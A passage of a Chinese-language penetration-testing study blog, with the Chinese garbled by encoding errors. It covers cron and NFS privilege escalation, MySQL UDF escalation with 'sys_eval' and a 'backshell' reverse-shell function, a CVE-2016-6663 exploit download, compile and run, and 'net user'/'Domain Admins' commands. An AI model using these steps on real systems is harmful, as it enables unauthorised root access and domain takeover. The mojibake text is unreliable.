title="è®¡åˆ’ä»»åŠ¡ææƒ"></a>è®¡åˆ’ä»»åŠ¡ææƒ</h5><p>crontabå‘½ä»¤ç”¨æ¥å®šæœŸæ‰§è¡Œç¨‹åº</p><p>è¯­æ³•æ ¼å¼</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">-e   ç¼–è¾‘å½“å‰çš„crontabæ–‡ä»¶ï¼Œé»˜è®¤ä¿å­˜åœ¨<span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>ç”¨æˆ·åä¸‹<br>-r   åˆ é™¤ç›®å‰çš„æ—¶ç¨‹è¡¨<br>-l   åˆ—å‡ºç›®å‰çš„æ—¶ç¨‹è¡¨<br><br><br>åˆ† æ—¶ æ—¥ æœˆ å‘¨ éœ€è¦æ‰§è¡Œçš„å‘½ä»¤<br><br>åˆ†ï¼š<span class="hljs-number">0</span>~<span class="hljs-number">59</span><br>æ—¶ï¼š<span class="hljs-number">0</span>~<span class="hljs-number">23</span><br>æ—¥ï¼š<span class="hljs-number">1</span>~<span class="hljs-number">31</span><br>æœˆï¼š<span class="hljs-number">1</span>~<span class="hljs-number">12</span><br>å‘¨ï¼š<span class="hljs-number">0</span>~<span class="hljs-number">6</span> <span class="hljs-comment">#0ä»£è¡¨å‘¨æ—¥</span><br>*ï¼šï¼ˆæ˜Ÿå·ï¼‰ä»£è¡¨å–å€¼èŒƒå›´ä¸­çš„æ¯ä¸€ä¸ªæ•°å­—<br>-ï¼šï¼ˆå‡å·ï¼‰è¿ç»­åŒºé—´è¡¨è¾¾å¼ï¼Œæƒ³è¦ä»£è¡¨<span class="hljs-number">1</span>~<span class="hljs-number">7</span>ï¼Œåˆ™éœ€è¦å†™æˆ<span class="hljs-number">1</span>-<span class="hljs-number">7</span><br><span class="hljs-regexp">/ï¼šï¼ˆæ–œæ ï¼‰è¡¨ç¤ºæ¯xä¸ªã€‚ä¾‹å¦‚æƒ³åœ¨æ¯10åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼Œåˆ™åœ¨åˆ†çš„ä½ç½®å†™ï¼š*/</span><span class="hljs-number">10</span><br>,ï¼šï¼ˆé€—å·ï¼‰è¡¨ç¤ºå¤šä¸ªå–å€¼ã€‚å¦‚æœæƒ³åœ¨<span class="hljs-number">1</span>ç‚¹ï¼Œ<span class="hljs-number">3</span>ç‚¹ï¼Œ<span class="hljs-number">5</span>ç‚¹æ‰§è¡Œä¸€æ¬¡ï¼Œåˆ™åœ¨æ—¶çš„ä½ç½®å†™ï¼š<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span><br><br>*<span class="hljs-regexp">/2 * * * * echo `date` &gt;&gt; /</span>tmp/stu01<br>è¡¨ç¤ºæ¯ä¸¤åˆ†é’Ÿè¾“å‡ºæ—¶é—´åˆ°<span class="hljs-regexp">/tmp/</span>stu01æ–‡ä»¶<br><br><span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/u</span>ser ç”¨æ¥åŒºåˆ†æ¯ä¸ªç”¨æˆ·è‡ªå·±çš„æ‰§è¡Œè®¡åˆ’<br><span class="hljs-regexp">/etc/</span>crontab è¡¨ç¤ºç³»ç»Ÿæ‰§è¡Œè®¡åˆ’ï¼Œéœ€è¦åœ¨äº”ä¸ª*åé¢åŠ ä¸Šç”¨æˆ·<br>*<span class="hljs-regexp">/1 * * * * root  ls /</span>&gt;&gt; <span class="hljs-regexp">/tmp/</span>cron<br><span class="hljs-regexp">/etc/</span>cron.deny   è¡¨ç¤ºåªæ‹’ç»å“ªäº›ç”¨æˆ·ä¸èƒ½ä»–ç”¨crontabï¼Œé»˜è®¤å­˜åœ¨ç©ºæ–‡ä»¶<br><span class="hljs-regexp">/etc/</span>cron.allow  è¡¨ç¤ºåªå…è®¸å“ªäº›ç”¨æˆ·ä½¿ç”¨crontab<br><br>æŸ¥çœ‹å®šæ—¶ä»»åŠ¡ï¼šcat <span class="hljs-regexp">/etc/</span>crontab<br></code></pre></td></tr></table></figure><p>åŸç†å°±æ˜¯é€šè¿‡ä¿®æ”¹rootç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡çš„å†…å®¹æ¥ææƒ</p><ol><li><p>rootæƒé™çš„å®šæ—¶ä»»åŠ¡è„šæœ¬æ™®é€šç”¨æˆ·å¯å†™</p><ul><li>rootæƒé™æ‰§è¡Œçš„å®šæ—¶ä»»åŠ¡æˆ–è€…å…¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹ï¼Œåœ°æƒé™ç”¨æˆ·æ‹¥æœ‰å†™æƒé™ï¼Œåˆ™å¯ä»¥è¿›è¡Œææƒ</li></ul><p>é¦–å…ˆä»¥rootç”¨æˆ·çš„èº«ä»½åˆ›å»ºäº†ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œæ¯åˆ†é’Ÿå‘æ–‡ä»¶ä¸­å†™å…¥å­—ç¬¦ä¸²</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721112724742.png" alt="image-20210721112724742"></p><blockquote><p> æœ¬åœ°æµ‹è¯•æ—¶åé»˜è®¤çš„<code>/var/spool/cron/crontabs</code>æ™®é€šç”¨æˆ·æ²¡æœ‰å¯è¯»æƒé™</p></blockquote><p>è¿™é‡Œä½¿ç”¨æ™®é€šç”¨æˆ·ä¿®æ”¹rootç”¨æˆ·çš„å®šæ—¶è„šæœ¬</p><p>ä¿®æ”¹å®šæ—¶ä»»åŠ¡å†…å®¹ææƒçš„æ–¹æ³•å°±æœ‰å¾ˆå¤šäº†ï¼Œå¯ä»¥ç›´æ¥æ·»åŠ ç”¨æˆ·ï¼Œåå¼¹shellï¼Œâ€¦â€¦â€¦â€¦</p></li><li><p>rootæƒé™çš„å®šæ—¶ä»»åŠ¡è°ƒç”¨çš„è„šæœ¬æ™®é€šç”¨æˆ·å¯å†™</p><ul><li>å®šæ—¶ä»»åŠ¡å¯èƒ½å¹¶ä¸æ˜¯å­¤ç«‹å­˜åœ¨çš„ï¼Œä»–ä¼šè°ƒç”¨å¾ˆå¤šåˆ«çš„shellè„šæœ¬æ¥å®Œæˆæ“ä½œï¼Œrootæƒé™å®šæ—¶ä»»åŠ¡è°ƒç”¨çš„è„šæœ¬ä¹Ÿæ˜¯ä»¥rootæƒé™æ‰§è¡Œçš„</li></ul><p>è¿™ä¸ªçš„å¤§è‡´è¿‡ç¨‹å’Œä¸Šé¢çš„ä¸€æ ·</p></li></ol><blockquote><p>å¯¹äºè®¡åˆ’ä»»åŠ¡ææƒçš„æ–¹æ³•ï¼Œéœ€è¦æœ‰å¯¹ä¸€äº›æ–‡ä»¶çš„å¯å†™å¯è¯»æƒé™ï¼Œé™åˆ¶è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œä¸æ˜¯ç‰¹åˆ«æ–¹ä¾¿ã€‚</p></blockquote><h5 id="NFSææƒ"><a href="#NFSææƒ" class="headerlink" title="NFSææƒ"></a>NFSææƒ</h5><p>NFSï¼ˆç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œæ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯/æœåŠ¡ç«¯åº”ç”¨ç¨‹åºï¼Œæ˜¯ä¸€ä¸ªå…±äº«ç›®å½•ã€‚</p><p>æ‰§è¡Œ<code>cat /etc/exports</code> å¦‚æœæœ‰<code>no_root_squash</code>å­—æ ·ï¼Œå°±è¯´æ˜rootç”¨æˆ·å¯¹å…±äº«ç›®å½•æœ‰å¾ˆé«˜çš„æƒé™æ§åˆ¶ï¼Œå°±åƒåœ¨æœ¬åœ°ä¸€æ ·ï¼Œæˆ‘ä»¬åœ¨è·å¾—ä¸€å°æœºå™¨çš„rootæƒé™åå°±å¯ä»¥é€šè¿‡nfsåœ¨å¦ä¸€å°ä½æƒé™æœºå™¨ä¸Šå®ç°ææƒã€‚</p><p>ææƒçš„è¿‡ç¨‹å°±æ˜¯åˆ©ç”¨é«˜æƒé™ä¸»æœºåœ¨å…±äº«ç›®å½•ä¸­åˆ›å»ºå¤åˆ¶ä¸€ä¸ªbashï¼Œç„¶åå†èµ‹äºˆsuidæƒé™ï¼Œè¿™æ ·å°±å¯ä»¥ææƒäº†</p><blockquote><p>å¹³æ—¶é‡åˆ°æƒ…å†µä¸å¤š</p></blockquote><h5 id="MySQLææƒ"><a href="#MySQLææƒ" class="headerlink" title="MySQLææƒ"></a>MySQLææƒ</h5><p><a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><ol><li><p>UDFææƒ</p><p><strong>åŸç†</strong>ï¼šç”¨æˆ·é€šè¿‡æ•°æ®åº“ä¸­çš„è‡ªå®šä¹‰å‡½æ•°åŠŸèƒ½ï¼Œæ·»åŠ æ–°çš„å‡½æ•°ã€‚</p><p><strong>æ”»å‡»è¿‡ç¨‹</strong></p><ol><li><p>é€‰æ‹©åŠ¨æ€é“¾æ¥åº“</p><p>å¦‚æœæ˜¯ MySQL&gt;=5.1 ç‰ˆæœ¬ï¼Œå°±å¿…é¡»æŠŠUDFçš„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶æ”¾ç½®äºMySQLå®‰è£…ç›®å½•ä¸‹çš„lib\pluginæ–‡ä»¶å¤¹ä¸‹é¢æ‰èƒ½åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ï¼ŒåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶åœ¨å¸¸ç”¨çš„sqlmapï¼ˆ/data/udf/mysqlï¼‰å’ŒMSFï¼ˆ/embedded/framework/data/exploits/mysqlï¼‰ä¸­å°±æœ‰</p><blockquote><p>sqlmapä¸­çš„åŠ¨æ€é“¾æ¥åº“ä¸ºäº†é˜²æ­¢è¢«è¯¯æ€éƒ½è¢«ç»è¿‡äº†ç¼–ç å¤„ç†ï¼Œéœ€è¦ä½¿ç”¨sqlmapè‡ªå¸¦çš„è§£ç å·¥å…·è§£ç åä½¿ç”¨ï¼ˆ/extra/cloak/cloak.pyï¼‰</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># è§£ç  32 ä½çš„ Linux åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># è§£ç  64 ä½çš„ Linux åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/linux/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># è§£ç  32 ä½çš„ Windows åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># è§£ç  64 ä½çš„ Windows åŠ¨æ€é“¾æ¥åº“</span><br>âœ python3 cloak.py -d -i ..<span class="hljs-regexp">/../</span>data<span class="hljs-regexp">/udf/my</span>sql<span class="hljs-regexp">/windows/</span><span class="hljs-number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure></li><li><p>æ‰¾åˆ°é¶æœºä¸­åŠ¨æ€é“¾æ¥åº“çš„å­˜æ”¾ä½ç½®</p><p><code>show variables like &#39;%plugin%&#39;;</code></p><blockquote><p>å¦‚æœä¸å­˜åœ¨ï¼Œå¯ä»¥ä¾é è‡ªå·±æ‰‹å·¥åœ¨MySQLçš„å®‰è£…ç›®å½•åˆ›å»º\lib\pluginæ–‡ä»¶å¤¹</p><p>å¯»æ‰¾å®‰è£…ç›®å½•ï¼šselect @@basedir;</p></blockquote></li><li><p>å†™å…¥åŠ¨æ€é“¾æ¥åº“</p><ul><li><p>æœ‰SQLæ³¨å…¥å¹¶ä¸”æ˜¯æœ€é«˜æƒé™ï¼Œpluginç›®å½•å¯ä»¥å†™å…¥å¹¶ä¸”éœ€è¦<code>secure_file_priv</code>æ— é™åˆ¶ï¼ŒMySQLæ’ä»¶ç›®å½•å¯ä»¥è¢«MySQLå†™å…¥ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥ä½¿ç”¨sqlmapä¸Šä¼ åŠ¨æ€é“¾æ¥åº“ï¼ŒGETè¯·æ±‚æœ‰å­—èŠ‚é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥ä¸€èˆ¬POSTè¯·æ±‚æ‰å¯ä»¥æ‰§è¡Œè¿™æ ·çš„æ”»å‡»ã€‚</p></li><li><p>æ— SQLæ³¨å…¥å°±ç›´æ¥æ“ä½œSQLè¯­å¥ï¼Œå½“<code>secure_file_priv</code>æ— é™åˆ¶çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥å†™å…¥pluginç›®å½•ä¸‹</p><ul><li><p>å†™å…¥æ—¶æœ€å¥½å°†å†…å®¹ä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç å†å†™å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">seler 0xâ€¦â€¦â€¦â€¦ into dumpfile path;<br>outfileï¼šå¤šè¡Œå†™å…¥<br>dumpfileï¼šå•è¡Œå†™å…¥<br>å¦‚è„±åº“æ—¶ï¼Œé‚£å°±ç”¨outfileæ›´å¥½ä½¿ï¼Œä½†æ˜¯å¦‚æœç”¨outfifeå»å¯¼å‡ºäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå‡ºé”™ï¼Œå› ä¸ºoutfileå‡½æ•°ä¼šåœ¨è¡Œæœ«ç«¯å†™å…¥æ–°è¡Œï¼Œæ›´è‡´å‘½çš„æ˜¯ä¼šè½¬ä¹‰æ¢è¡Œç¬¦ï¼Œè¿™æ ·çš„è¯è¿™ä¸ªäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶å°±ä¼šè¢«ç ´åï¼Œæ‰€ä»¥ä¸€èˆ¬å¯¼å‡ºå¯¼å‡ºäºŒè¿›åˆ¶æ–‡ä»¶(udfææƒ)æ—¶å°±ç”¨dumpfile<br><br>è·å–åå…­è¿›åˆ¶<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">load_file</span>(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>));<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">load_file</span>(<span class="hljs-string">&#x27;/lib_mysqludf_sys_64.so&#x27;</span>)) <span class="hljs-keyword">into</span> <span class="hljs-keyword">dumpfile</span> <span class="hljs-string">&#x27;/tmp/udf.txt&#x27;</span>; å¯¼å…¥æ–‡ä»¶ä¸­æ–¹ä¾¿è§‚å¯Ÿ<br></code></pre></td></tr></table></figure></li><li><p>ä¹Ÿå¯ä»¥å…ˆå†™å…¥å°é©¬ï¼Œè·å–shellï¼Œå†ç›´æ¥ä¸Šä¼ æ–‡ä»¶</p></li></ul></li></ul></li><li><p>åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°ï¼Œå¹¶è°ƒç”¨å‘½ä»¤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">FUNCTION</span> sys_eval <span class="hljs-keyword">RETURNS</span> <span class="hljs-keyword">STRING</span> <span class="hljs-keyword">SONAME</span> <span class="hljs-string">&#x27;udf.dll&#x27;</span>; åˆ›å»ºå‡½æ•°<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func; æŸ¥è¯¢æ˜¯å¦æ–°å¢äº†å‡½æ•°<br><span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&quot;whoami&quot;</span>); æ‰§è¡Œå‘½ä»¤<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> sys_eval; åˆ é™¤è‡ªå®šä¹‰å‡½æ•°<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>å¦‚æœæ•°æ®åº“åœ¨å†…ç½‘ï¼Œæ— æ³•ç›´æ¥è¿æ¥MySQLæˆ–è€…MySQLä¸å…è®¸å¤–è¿ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ç½‘é¡µè„šæœ¬ï¼ˆç±»ä¼¼äºå¤§é©¬ï¼‰PHPå¤§é©¬è„šæœ¬ï¼š<a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php%EF%BC%9B%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8Navicat%E7%BB%93%E5%90%88%E5%AE%83%E8%87%AA%E5%B8%A6%E7%9A%84tunnel%E9%9A%A7%E9%81%93%E8%84%9A%E6%9C%AC%E6%90%AD%E5%BB%BAHTTP%E9%80%9A%E9%81%93%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E3%80%82">https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.phpï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨Navicatç»“åˆå®ƒè‡ªå¸¦çš„tunneléš§é“è„šæœ¬æ­å»ºHTTPé€šé“è¿æ¥æ•°æ®åº“ã€‚</a></p></blockquote><p><strong>åå¼¹shell</strong></p><p>ä½¿ç”¨è¢«å®šåˆ¶å¥½çš„åŠ¨æ€é“¾æ¥åº“ï¼Œè°ƒç”¨å‡½æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼Œåå¼¹shellç­‰</p><p>å·¥å…·ä¸‹è½½ï¼š<a href="https://sqlsec.lanzoux.com/iEQA0ijfu6d">https://sqlsec.lanzoux.com/iEQA0ijfu6d</a></p><p>åŒæ ·çš„å¯¼å…¥ç„¶ååˆ›å»ºå‡½æ•°</p><p><code>CREATE FUNCTION backshell RETURNS STRING SONAME &#39;udf.dll&#39;;</code></p><p>åå¼¹shell</p><p><code>select backshell(&quot;IP&quot;, port);</code></p></li><li><p>MOFææƒ</p><p>MOF ææƒæ˜¯ä¸€ä¸ªæœ‰å†å²çš„æ¼æ´ï¼ŒåŸºæœ¬ä¸Šåœ¨ Windows Server 2003 çš„ç¯å¢ƒä¸‹æ‰å¯ä»¥æˆåŠŸã€‚æ€»ç»“Windowsçš„æ—¶å€™å†ä»”ç»†è¡¥å……ã€‚</p></li><li><p>å¯åŠ¨é¡¹ææƒ</p><p>å¸¸è§äºWindowsï¼Œåé¢Windowsææƒçš„æ—¶å€™åœ¨è¡¥å……</p></li><li><p>CVE-2016-6663</p><p><strong>æ¼æ´è¯¦æƒ…</strong>ï¼šç«äº‰æ¡ä»¶ææƒæ¼æ´ï¼Œä¸€ä¸ªæ‹¥æœ‰ CREATE/INSERT/SELECT ä½æƒé™çš„è´¦æˆ·ææƒæˆåŠŸåå¯ä»¥ç³»ç»Ÿç”¨æˆ·èº«ä»½æ‰§è¡Œä»»æ„ä»£ç ï¼Œææƒçš„ç”¨æˆ·ä¸º mysql ç”¨æˆ·ï¼Œæ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯å°†ä½æƒé™çš„ www-data æƒé™æå‡ä¸º mysql æƒé™ï¼Œè¦è·å–rootç”¨æˆ·æƒé™ï¼Œéœ€è¦ç»“åˆä¹‹å‰çš„ææƒæ–¹æ³•è¿›ä¸€æ­¥æ“ä½œã€‚</p><p><strong>æ¼æ´æ¡ä»¶ï¼š</strong></p><ol><li>Getshell æ‹¿åˆ° www-data æƒé™</li><li>æ‹¿åˆ° CREATE/INSERT/SELECT ä½æƒé™çš„ MySQL è´¦æˆ·</li><li>å…³é”®æå–æ­¥éª¤éœ€è¦åœ¨äº¤äº’ç¯å¢ƒä¸‹ï¼Œæ‰€ä»¥éœ€è¦åå¼¹shell</li><li>MySQLç‰ˆæœ¬éœ€è¦ &lt;=5.5.51 æˆ– 5.6.x &lt;=5.6.32 æˆ– 5.7.x &lt;=5.7.14 æˆ– 8.x &lt; 8.0.1</li><li>MariaDBç‰ˆæœ¬éœ€è¦ &lt;= 5.5.51 æˆ– 10.0.x &lt;= 10.0.27 æˆ– 10.1.x &lt;= 10.1.17</li></ol><p><strong>æ¼æ´å¤ç°</strong></p><p>ç¯å¢ƒæ­å»ºï¼šä½¿ç”¨å›½å…‰å¸ˆå‚…çš„dockerç¯å¢ƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æ‹‰å–é•œåƒ</span><br>docker pull sqlsec/cve-2016-6663<br><span class="hljs-comment"># éƒ¨ç½²é•œåƒ</span><br>docker run -d -p 3306:3306 -p 8080:80 --name CVE-2016-6663 sqlsec/cve-2016-6663<br></code></pre></td></tr></table></figure><p>è¿æ¥ä¸Šshellï¼Œè·å¾—ä¸€ä¸ªä½æƒé™ç”¨æˆ·å¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210721164602551.png" alt="image-20210721164602551"></p><p>ä¸Šä¼ EXPï¼Œå¹¶ä¸”ç¼–è¯‘æ‰§è¡Œ</p><p>â€‹    EXPï¼š<a href="https://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c">https://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c</a></p><p>â€‹    ç¼–è¯‘EXPï¼š<code>gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</code></p><p>â€‹    æ‰§è¡ŒEXPè¿›è¡Œææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./mysql-privesc-race æ•°æ®åº“ç”¨æˆ·å å¯†ç  æ•°æ®åº“åœ°å€ æ•°æ®åº“<br><br>./mysql-privesc-race <span class="hljs-built_in">test</span> 123456 localhost <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨èšå‰‘ï¼Œå†°èç›´æ¥æ‰§è¡Œæœ‰ææƒé—®é¢˜ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦åå¼¹shellæ‰§è¡Œ</p><p>ææƒæˆåŠŸï¼Œè¿›ä¸€æ­¥ææƒä¸Šé¢æŒ‡å‡ºéœ€è¦<code>CVE-2016-6662 or CVE-2016-6664</code>ï¼Œä¹Ÿå¯ä»¥çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–çš„ææƒæ¼æ´</p></li></ol><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><h4 id="å¸¸ç”¨å‘½ä»¤-1"><a href="#å¸¸ç”¨å‘½ä»¤-1" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h4><p><a href="https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/">https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/</a></p><blockquote><p>æ„Ÿè§‰å¯¹äºWindowsç”¨çš„æ¯”è¾ƒå¤šçš„è¿˜æ˜¯å›¾å½¢åŒ–ç•Œé¢ï¼Œå‘½ä»¤çš„ä½¿ç”¨ä¸æ˜¯ç‰¹åˆ«å¤š</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ipconfig /all æŸ¥çœ‹IP<br>whoami æŸ¥çœ‹å½“å‰ç”¨æˆ·<br>systmeinfo æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯<br>netstat -ano æŸ¥çœ‹ç«¯å£å¼€æ”¾æƒ…å†µ<br>tracert ip/åŸŸå  è·¯ç”±è¿½è¸ª<br>ping æ£€æµ‹ä¸»æœºä¹‹é—´çš„è¿é€šæ€§<br>ipconfig /fulshdns åˆ·æ–°æœ¬åœ°DNSç¼“å­˜<br><br>tasklist æ˜¾ç¤ºå½“å‰è¿è¡Œçš„è¿›ç¨‹<br>taskkill /pid pidnum ç»“æŸè¿›ç¨‹<br>net start æ˜¾ç¤ºå½“å‰è¿è¡Œçš„æœåŠ¡<br>net start æœåŠ¡å  å¯åŠ¨æœåŠ¡<br>net stop æœåŠ¡å  åœæ­¢æŒ‡å®šæœåŠ¡<br>net statistics workstation æŸ¥çœ‹ç³»ç»Ÿå¼€æœºæ—¶é—´<br><br>dir åˆ—å‡ºå½“å‰ç›®å½•æ–‡ä»¶<br>d:   e:  åˆ‡æ¢åˆ°å¯¹åº”ç£ç›˜<br>tree æ˜¾ç¤ºç›®å½•ç»“æ„<br><br>æ·»åŠ ç”¨æˆ·  net<span class="hljs-built_in"> user </span>username password  /add<br>æ·»åŠ åŸŸç”¨æˆ· net<span class="hljs-built_in"> user </span>username password /<span class="hljs-builtin-name">add</span> /domain<br>æ·»åŠ ç”¨æˆ·åˆ°åŸŸç®¡ net<span class="hljs-built_in"> group </span><span class="hljs-string">&quot;Domain Admins&quot;</span> username /<span class="hljs-builtin-name">add</span> /domain<br></code></pre></td></tr></table></figure><h4 id="Windowsåè®®"><a href="#Windowsåè®®" class="headerlink" title="Windowsåè®®"></a>Windowsåè®®</h4><h5 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h5><p><a href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a></p><p>Kerberosåè®®æ˜¯ä¸€ç§è®¡ç®—æœºç½‘ç»œè®¤è¯åè®®ï¼Œå®ƒå¯ä»¥ä¸ºç½‘ç»œä¸­é€šä¿¡çš„åŒæ–¹æä¾›ä¸¥æ ¼çš„èº«ä»½éªŒè¯æœåŠ¡ï¼Œç¡®ä¿é€šä¿¡åŒæ–¹èº«ä»½çš„çœŸå®æ€§å’Œå®‰å…¨æ€§ã€‚ä¸»è¦ç”¨äºåŸŸç¯å¢ƒ</p><p>åè®®çš„ç»„æˆï¼š</p><ul><li><p>å®¢æˆ·ç«¯ï¼ˆclientï¼‰</p></li><li><p>æœåŠ¡ç«¯ï¼ˆServerï¼‰</p></li><li><p>å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKDCï¼‰ï¼šå¯†é’¥åˆ†å‘ä¸­å¿ƒåˆåˆ†ä¸ºä¸¤éƒ¨åˆ†</p><ul><li>ASï¼šè®¤è¯æœåŠ¡å™¨ï¼Œä¸“é—¨ç”¨æ¥è®¤è¯å®¢æˆ·ç«¯èº«ä»½å¹¶å‘æ”¾å®¢æˆ·ç”¨æˆ·è®¿é—®TGSçš„TGTï¼ˆç¥¨æ®æˆäºˆç¥¨æ®ï¼‰</li><li>TGSï¼šç¥¨æ®æˆäºˆæœåŠ¡å™¨</li></ul><blockquote><p>KDCä¸åœ¨åŸŸæ§è¿è¡Œçš„å…¶ä»–å®‰å…¨æœåŠ¡é›†æˆï¼ŒKDCä½¿ç”¨åŸŸçš„ADåŸŸæœåŠ¡å™¨æ•°æ®åº“ä½œä¸ºå…¶å®‰å…¨æ•°æ®åº“ï¼ŒADåŸŸæœåŠ¡æ˜¯åŸŸæˆ–æ—ä¸­é»˜è®¤çš„Kerberoså®ç°å¿…é¡»çš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹KDCå®‰è£…åœ¨åŸŸæ§ä¸